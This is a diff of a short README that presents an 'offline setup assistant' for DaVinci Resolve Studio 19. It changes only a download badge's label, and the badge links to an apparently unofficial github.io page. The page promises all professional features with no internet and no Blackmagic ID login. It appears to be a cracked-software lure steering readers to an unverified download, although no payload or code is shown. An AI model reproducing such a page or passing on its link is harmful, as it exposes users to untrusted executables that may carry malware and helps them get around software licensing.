@@ -1,6 +1,6 @@
 # DaVinci Resolve Studio 19 — Offline Setup Assistant
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)]([#](https://davinci-resolve-studio-19.github.io/.github/))
+[![Download Desktop App](https://img.shields.io/badge/Download-Desktop_App-blueviolet)]([#](https://davinci-resolve-studio-19.github.io/.github/))
 
 This guide shows how to configure **DaVinci Resolve Studio 19** for fully offline use.  
 All professional features remain available with **zero internet** and **no Blackmagic ID login** after installation.
